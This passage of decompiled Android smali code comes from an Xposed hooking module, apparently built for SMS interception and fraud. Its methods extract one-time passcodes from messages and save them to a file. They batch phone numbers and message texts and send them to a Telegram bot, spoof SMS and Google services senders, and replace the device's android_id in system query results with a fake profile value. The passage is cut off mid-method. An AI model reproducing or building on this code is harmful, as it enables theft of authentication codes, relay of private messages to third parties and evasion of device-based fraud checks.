    .line 779
    :cond_0
    if-eqz p2, :cond_1

    move-object v0, p2

    goto :goto_0

    :cond_1
    const-string v0, ""

    :goto_0
    invoke-static {p1, v0}, Lcom/rebel/module/NativeBridge;->resolveTemplate(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 782
    .local v0, "resolved":Ljava/lang/String;
    if-eqz p2, :cond_2

    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_2

    .line 783
    invoke-static {p2}, Lcom/rebel/module/NativeBridge;->extractOtp(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 784
    .local v1, "otp":Ljava/lang/String;
    if-eqz v1, :cond_2

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_2

    .line 785
    sput-object v1, Lcom/rebel/module/XposedHook;->lastExtractedOtp:Ljava/lang/String;

    .line 786
    invoke-direct {p0, v1}, Lcom/rebel/module/XposedHook;->writeOtpToFile(Ljava/lang/String;)V

    .line 791
    .end local v1    # "otp":Ljava/lang/String;
    :cond_2
    return-object v0

    .line 776
    .end local v0    # "resolved":Ljava/lang/String;
    :cond_3
    :goto_1
    return-object p1
.end method

.method private declared-synchronized sendBatchSummary()V
    .locals 11

    monitor-enter p0

    .line 1063
    :try_start_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    const/4 v1, 0x2

    const/4 v2, 0x0

    if-ge v0, v1, :cond_0

    .line 1064
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    .line 1065
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchLogIds:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    .line 1066
    iput-object v2, p0, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 1067
    monitor-exit p0

    return-void

    .line 1069
    .end local p0    # "this":Lcom/rebel/module/XposedHook;
    :cond_0
    :try_start_1
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchBotToken:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchChatId:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    if-eqz v0, :cond_1

    move-object v5, p0

    goto/16 :goto_4

    .line 1073
    :cond_1
    :try_start_2
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    .line 1078
    .local v0, "count":I
    new-array v1, v0, [Ljava/lang/String;

    .line 1079
    .local v1, "nums":[Ljava/lang/String;
    new-array v3, v0, [Ljava/lang/String;

    .line 1080
    .local v3, "msgs":[Ljava/lang/String;
    const/4 v4, 0x0

    .local v4, "i":I
    :goto_0
    if-ge v4, v0, :cond_2

    .line 1081
    iget-object v5, p0, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v5, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, [Ljava/lang/String;

    const/4 v6, 0x0

    aget-object v5, v5, v6

    aput-object v5, v1, v4

    .line 1082
    iget-object v5, p0, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v5, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, [Ljava/lang/String;

    const/4 v6, 0x1

    aget-object v5, v5, v6

    aput-object v5, v3, v4

    .line 1080
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 1086
    .end local v4    # "i":I
    :cond_2
    invoke-static {v1, v3, v0}, Lcom/rebel/module/NativeBridge;->formatBatch([Ljava/lang/String;[Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v4

    move-object v8, v4

    .line 1087
    .local v8, "text":Ljava/lang/String;
    iget-object v6, p0, Lcom/rebel/module/XposedHook;->batchBotToken:Ljava/lang/String;

    iget-object v7, p0, Lcom/rebel/module/XposedHook;->batchChatId:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    const-wide/16 v9, -0x1

    move-object v5, p0

    .restart local p0    # "this":Lcom/rebel/module/XposedHook;
    :try_start_3
    invoke-direct/range {v5 .. v10}, Lcom/rebel/module/XposedHook;->sendTelegramRaw(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 1093
    .end local v0    # "count":I
    .end local v1    # "nums":[Ljava/lang/String;
    .end local v3    # "msgs":[Ljava/lang/String;
    .end local v8    # "text":Ljava/lang/String;
    :try_start_4
    iget-object v0, v5, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    .line 1094
    iget-object v0, v5, Lcom/rebel/module/XposedHook;->batchLogIds:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    .line 1095
    iput-object v2, v5, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;

    .line 1096
    goto :goto_3

    .line 1093
    .end local p0    # "this":Lcom/rebel/module/XposedHook;
    :catchall_0
    move-exception v0

    goto :goto_1

    .line 1089
    :catch_0
    move-exception v0

    goto :goto_2

    .line 1093
    :catchall_1
    move-exception v0

    move-object v5, p0

    :goto_1
    iget-object v1, v5, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->clear()V

    .line 1094
    iget-object v1, v5, Lcom/rebel/module/XposedHook;->batchLogIds:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->clear()V

    .line 1095
    iput-object v2, v5, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;

    .line 1096
    throw v0

    .line 1089
    :catch_1
    move-exception v0

    move-object v5, p0

    .line 1093
    :goto_2
    iget-object v0, v5, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    .line 1094
    iget-object v0, v5, Lcom/rebel/module/XposedHook;->batchLogIds:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    .line 1095
    iput-object v2, v5, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_3

    .line 1096
    nop

    .line 1097
    :goto_3
    monitor-exit p0

    return-void

    .line 1069
    :cond_3
    move-object v5, p0

    .line 1070
    :goto_4
    monitor-exit p0

    return-void

    .line 1062
    :catchall_2
    move-exception v0

    move-object v5, p0

    :goto_5
    :try_start_5
    monitor-exit p0
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    throw v0

    :catchall_3
    move-exception v0

    goto :goto_5
.end method

.method private sendIntentResult(Landroid/app/PendingIntent;ILjava/lang/String;)V
    .locals 0
    .param p1, "intent"    # Landroid/app/PendingIntent;
    .param p2, "resultCode"    # I
    .param p3, "logMessage"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Landroid/app/PendingIntent$CanceledException;
        }
    .end annotation

    .line 1010
    invoke-direct {p0, p1, p2, p3}, Lcom/rebel/module/XposedHook;->firePendingIntentWithResultCode(Landroid/app/PendingIntent;ILjava/lang/String;)V

    .line 1011
    return-void
.end method

.method private sendTelegramNotification(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V
    .locals 8
    .param p1, "botToken"    # Ljava/lang/String;
    .param p2, "chatId"    # Ljava/lang/String;
    .param p3, "destNumber"    # Ljava/lang/String;
    .param p4, "message"    # Ljava/lang/String;
    .param p5, "sourceApp"    # Ljava/lang/String;
    .param p6, "logId"    # J

    .line 1022
    :try_start_0
    invoke-static {p3, p4, p5}, Lcom/rebel/module/NativeBridge;->formatNotification(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 1025
    .local v0, "text":Ljava/lang/String;
    iget-object v1, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-eqz v1, :cond_2

    .line 1026
    :try_start_1
    iget-object v1, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v1}, Lcom/rebel/module/ConfigManager;->getFooterText()Ljava/lang/String;

    move-result-object v1

    .line 1027
    .local v1, "footer":Ljava/lang/String;
    if-eqz v1, :cond_0

    .line 1028
    const-string v2, "_"

    const-string v3, "\\_"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    move-object v1, v2

    .line 1030
    :cond_0
    const-string v2, "{footer}"

    if-eqz v1, :cond_1

    move-object v3, v1

    goto :goto_0

    :cond_1
    const-string v3, ""

    :goto_0
    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-object v0, v2

    move-object v5, v0

    goto :goto_1

    .line 1034
    .end local v0    # "text":Ljava/lang/String;
    .end local v1    # "footer":Ljava/lang/String;
    :catch_0
    move-exception v0

    move-object v3, p1

    move-object v4, p2

    move-wide v6, p6

    goto :goto_2

    .line 1025
    .restart local v0    # "text":Ljava/lang/String;
    :cond_2
    move-object v5, v0

    .line 1033
    .end local v0    # "text":Ljava/lang/String;
    .local v5, "text":Ljava/lang/String;
    :goto_1
    move-object v2, p0

    move-object v3, p1

    move-object v4, p2

    move-wide v6, p6

    .end local p1    # "botToken":Ljava/lang/String;
    .end local p2    # "chatId":Ljava/lang/String;
    .end local p6    # "logId":J
    .local v3, "botToken":Ljava/lang/String;
    .local v4, "chatId":Ljava/lang/String;
    .local v6, "logId":J
    :try_start_2
    invoke-direct/range {v2 .. v7}, Lcom/rebel/module/XposedHook;->sendTelegramRaw(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 1037
    .end local v5    # "text":Ljava/lang/String;
    goto :goto_2

    .line 1034
    :catch_1
    move-exception v0

    goto :goto_2

    .end local v3    # "botToken":Ljava/lang/String;
    .end local v4    # "chatId":Ljava/lang/String;
    .end local v6    # "logId":J
    .restart local p1    # "botToken":Ljava/lang/String;
    .restart local p2    # "chatId":Ljava/lang/String;
    .restart local p6    # "logId":J
    :catch_2
    move-exception v0

    move-object v3, p1

    move-object v4, p2

    move-wide v6, p6

    .line 1038
    .end local p1    # "botToken":Ljava/lang/String;
    .end local p2    # "chatId":Ljava/lang/String;
    .end local p6    # "logId":J
    .restart local v3    # "botToken":Ljava/lang/String;
    .restart local v4    # "chatId":Ljava/lang/String;
    .restart local v6    # "logId":J
    :goto_2
    return-void
.end method

.method private sendTelegramRaw(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V
    .locals 3
    .param p1, "botToken"    # Ljava/lang/String;
    .param p2, "chatId"    # Ljava/lang/String;
    .param p3, "text"    # Ljava/lang/String;
    .param p4, "logId"    # J

    .line 1102
    :try_start_0
    const-string v0, "Markdown"

    invoke-static {p1, p2, p3, v0}, Lcom/rebel/module/NativeBridge;->nativeSendTelegram(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    .line 1103
    .local v0, "responseCode":I
    const/16 v1, 0xc8

    if-ne v0, v1, :cond_0

    .line 1104
    const-string v1, "SENT"

    invoke-direct {p0, p4, p5, v1}, Lcom/rebel/module/XposedHook;->updateLogTelegramStatus(JLjava/lang/String;)V

    .line 1105
    const-string v1, "SmsHook: Telegram sent successfully (HTTP 200)"

    invoke-static {v1}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    goto :goto_0

    .line 1107
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "FAILED_"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, p4, p5, v1}, Lcom/rebel/module/XposedHook;->updateLogTelegramStatus(JLjava/lang/String;)V

    .line 1108
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "SmsHook: Telegram send failed with HTTP "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1113
    .end local v0    # "responseCode":I
    :goto_0
    goto :goto_1

    .line 1110
    :catchall_0
    move-exception v0

    .line 1111
    .local v0, "t":Ljava/lang/Throwable;
    const-string v1, "ERROR"

    invoke-direct {p0, p4, p5, v1}, Lcom/rebel/module/XposedHook;->updateLogTelegramStatus(JLjava/lang/String;)V

    .line 1112
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "SmsHook: Telegram send error: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1114
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_1
    return-void
.end method

.method private shouldSpoofGmsSender()Z
    .locals 1

    .line 1119
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isSpoofSenderEnabled()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isGmsSenderEnabled()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private shouldSpoofSmsSender()Z
    .locals 1

    .line 1123
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isSpoofSenderEnabled()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isSmsSenderEnabled()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private spoofGsfCursor(Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V
    .locals 17
    .param p1, "param"    # Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;
    .param p2, "profile"    # Lcom/rebel/module/DeviceFakerManager$DeviceProfile;

    .line 2458
    move-object/from16 v1, p1

    move-object/from16 v2, p2

    :try_start_0
    invoke-virtual {v1}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->hasThrowable()Z

    move-result v0

    if-nez v0, :cond_15

    invoke-virtual {v1}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->getResult()Ljava/lang/Object;

    move-result-object v0

    instance-of v0, v0, Landroid/database/Cursor;

    if-nez v0, :cond_0

    goto/16 :goto_f

    .line 2461
    :cond_0
    iget-object v0, v2, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->androidId:Ljava/lang/String;

    if-nez v0, :cond_1

    .line 2462
    return-void

    .line 2465
    :cond_1
    iget-object v0, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    const/4 v3, 0x0

    aget-object v0, v0, v3

    move-object v4, v0

    .line 2466
    .local v4, "arg0":Ljava/lang/Object;
    if-nez v4, :cond_2

    .line 2467
    return-void

    .line 2468
    :cond_2
    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    move-object v5, v0

    .line 2470
    .local v5, "uriStr":Ljava/lang/String;
    invoke-virtual {v1}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->getResult()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/database/Cursor;

    move-object v6, v0

    .line 2473
    .local v6, "cursor":Landroid/database/Cursor;
    const-string v0, "content://com.google.android.gsf.gservices"

    invoke-virtual {v5, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v7, 0x2

    const-string v8, "value"

    const-string v9, "android_id"

    if-eqz v0, :cond_f

    .line 2475
    const/4 v0, 0x0

    .line 2476
    .local v0, "hasAndroidId":Z
    const/4 v10, 0x0

    .local v10, "i":I
    :goto_0
    :try_start_1
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    array-length v11, v11

    if-ge v10, v11, :cond_9

    .line 2477
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    instance-of v11, v11, [Ljava/lang/Object;

    if-eqz v11, :cond_5

    .line 2478
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    check-cast v11, [Ljava/lang/Object;

    .line 2479
    .local v11, "selArgs":[Ljava/lang/Object;
    array-length v12, v11

    move v13, v3

    :goto_1
    if-ge v13, v12, :cond_4

    aget-object v14, v11, v13

    .line 2480
    .local v14, "arg":Ljava/lang/Object;
    invoke-virtual {v9, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v15

    if-eqz v15, :cond_3

    .line 2481
    const/4 v0, 0x1

    .line 2482
    goto :goto_2

    .line 2479
    .end local v14    # "arg":Ljava/lang/Object;
    :cond_3
    add-int/lit8 v13, v13, 0x1

    goto :goto_1

    .line 2485
    .end local v11    # "selArgs":[Ljava/lang/Object;
    :cond_4
    :goto_2
    goto :goto_4

    :cond_5
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    instance-of v11, v11, [Ljava/lang/String;

    if-eqz v11, :cond_4

    .line 2486
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    check-cast v11, [Ljava/lang/String;

    .line 2487
    .local v11, "selArgs":[Ljava/lang/String;
    array-length v12, v11

    move v13, v3

    :goto_3
    if-ge v13, v12, :cond_7

    aget-object v14, v11, v13

    .line 2488
    .local v14, "arg":Ljava/lang/String;
    invoke-virtual {v9, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v15

    if-eqz v15, :cond_6

    .line 2489
    const/4 v0, 0x1

    .line 2490
    goto :goto_4

    .line 2487
    .end local v14    # "arg":Ljava/lang/String;
    :cond_6
    add-int/lit8 v13, v13, 0x1

    goto :goto_3

    .line 2494
    .end local v11    # "selArgs":[Ljava/lang/String;
    :cond_7
    :goto_4
    if-eqz v0, :cond_8

    .line 2495
    move v3, v0

    goto :goto_5

    .line 2476
    :cond_8
    add-int/lit8 v10, v10, 0x1

    goto :goto_0

    :cond_9
    move v3, v0

    .line 2498
    .end local v0    # "hasAndroidId":Z
    .end local v10    # "i":I
    .local v3, "hasAndroidId":Z
    :goto_5
    if-nez v3, :cond_a

    .line 2499
    return-void

    .line 2501
    :cond_a
    const-string v0, "key"

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    move v10, v0

    .line 2502
    .local v10, "keyCol":I
    invoke-interface {v6, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    move v8, v0

    .line 2504
    .local v8, "valCol":I
    if-ltz v10, :cond_e

    if-ltz v8, :cond_e

    invoke-interface {v6}, Landroid/database/Cursor;->getColumnCount()I

    move-result v0

    if-ne v0, v7, :cond_e

    .line 2505
    new-instance v0, Landroid/database/MatrixCursor;

    invoke-interface {v6}, Landroid/database/Cursor;->getColumnNames()[Ljava/lang/String;

    move-result-object v7

    invoke-direct {v0, v7}, Landroid/database/MatrixCursor;-><init>([Ljava/lang/String;)V

    move-object v7, v0

    .line 2506
    .local v7, "mc":Landroid/database/MatrixCursor;
    :goto_6
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_d

    .line 2507
    invoke-interface {v6, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    move-object v11, v0

    .line 2508
    .local v11, "key":Ljava/lang/String;
    invoke-interface {v6, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    move-object v12, v0

    .line 2509
    .local v12, "val":Ljava/lang/String;
    invoke-virtual {v9, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v0, :cond_b

    if-eqz v12, :cond_b

    .line 2512
    :try_start_2
    iget-object v0, v2, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->androidId:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 2513
    .local v0, "fakeHex":Ljava/lang/String;
    const/16 v13, 0x10

    invoke-static {v0, v13}, Ljava/lang/Long;->parseLong(Ljava/lang/String;I)J

    move-result-wide v13

    .line 2514
    .local v13, "fakeIdLong":J
    invoke-static {v13, v14}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v15

    filled-new-array {v9, v15}, [Ljava/lang/Object;

    move-result-object v15

    invoke-virtual {v7, v15}, Landroid/database/MatrixCursor;->addRow([Ljava/lang/Object;)V
    :try_end_2
    .catch Ljava/lang/NumberFormatException; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .end local v0    # "fakeHex":Ljava/lang/String;
    .end local v13    # "fakeIdLong":J
    goto :goto_7

    .line 2515
    :catch_0
    move-exception v0

    .line 2517
    .local v0, "e":Ljava/lang/NumberFormatException;
    :try_start_3
    iget-object v13, v2, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->androidId:Ljava/lang/String;

    filled-new-array {v9, v13}, [Ljava/lang/Object;

    move-result-object v13

    invoke-virtual {v7, v13}, Landroid/database/MatrixCursor;->addRow([Ljava/lang/Object;)V

    .line 2518
    .end local v0    # "e":Ljava/lang/NumberFormatException;
    :goto_7
    goto :goto_a

    .line 2521
    :cond_b
    invoke-interface {v6}, Landroid/database/Cursor;->getColumnCount()I

    move-result v0

    new-array v0, v0, [Ljava/lang/Object;

    .line 2522
    .local v0, "row":[Ljava/lang/Object;
    const/4 v13, 0x0

    .local v13, "c":I
    :goto_8
    invoke-interface {v6}, Landroid/database/Cursor;->getColumnCount()I

    move-result v14

    if-ge v13, v14, :cond_c

    .line 2523
    invoke-interface {v6, v13}, Landroid/database/Cursor;->getType(I)I

    move-result v14

    .line 2524
    .local v14, "type":I
    packed-switch v14, :pswitch_data_0

    goto :goto_9

    .line 2538
    :pswitch_0
    invoke-interface {v6, v13}, Landroid/database/Cursor;->getBlob(I)[B

    move-result-object v15

    aput-object v15, v0, v13

    goto :goto_9

    .line 2535
    :pswitch_1
    invoke-interface {v6, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    aput-object v15, v0, v13

    .line 2536
    goto :goto_9

    .line 2532
    :pswitch_2
    invoke-interface {v6, v13}, Landroid/database/Cursor;->getFloat(I)F

    move-result v15

    invoke-static {v15}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    move-result-object v15

    aput-object v15, v0, v13

    .line 2533
    goto :goto_9

    .line 2529
    :pswitch_3
    invoke-interface {v6, v13}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v15

    invoke-static/range {v15 .. v16}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v15

    aput-object v15, v0, v13

    .line 2530
    goto :goto_9

    .line 2526
    :pswitch_4
    const/4 v15, 0x0

    aput-object v15, v0, v13

    .line 2527
    nop

    .line 2522
    .end local v14    # "type":I
    :goto_9
    add-int/lit8 v13, v13, 0x1

    goto :goto_8

    .line 2542
    .end local v13    # "c":I
    :cond_c
    invoke-virtual {v7, v0}, Landroid/database/MatrixCursor;->addRow([Ljava/lang/Object;)V

    .line 2544
    .end local v0    # "row":[Ljava/lang/Object;
    .end local v11    # "key":Ljava/lang/String;
    .end local v12    # "val":Ljava/lang/String;
    :goto_a
    goto :goto_6

    .line 2545
    :cond_d
    invoke-interface {v6}, Landroid/database/Cursor;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    invoke-virtual {v7, v0}, Landroid/database/MatrixCursor;->respond(Landroid/os/Bundle;)Landroid/os/Bundle;

    .line 2546
    invoke-virtual {v1, v7}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->setResult(Ljava/lang/Object;)V

    .line 2547
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 2549
    .end local v7    # "mc":Landroid/database/MatrixCursor;
    :cond_e
    return-void

    .line 2553
    .end local v3    # "hasAndroidId":Z
    .end local v8    # "valCol":I
    .end local v10    # "keyCol":I
    :cond_f
    const-string v0, "settings/secure"

    invoke-virtual {v5, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_14

    .line 2555
    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    .line 2556
    .local v0, "isAndroidId":Z
    if-nez v0, :cond_13

    .line 2558
    const/4 v10, 0x2

    .local v10, "i":I
    :goto_b
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    array-length v11, v11

    if-ge v10, v11, :cond_13

    const/4 v11, 0x5

    if-ge v10, v11, :cond_13

    .line 2559
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    instance-of v11, v11, Ljava/lang/String;

    if-eqz v11, :cond_10

    .line 2560
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    check-cast v11, Ljava/lang/String;

    invoke-virtual {v11, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_12

    .line 2561
    const/4 v0, 0x1

    .line 2562
    goto :goto_e

    .line 2564
    :cond_10
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    instance-of v11, v11, [Ljava/lang/String;

    if-eqz v11, :cond_12

    .line 2565
    iget-object v11, v1, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v11, v11, v10

    check-cast v11, [Ljava/lang/String;

    array-length v12, v11

    move v13, v3

    :goto_c
    if-ge v13, v12, :cond_12

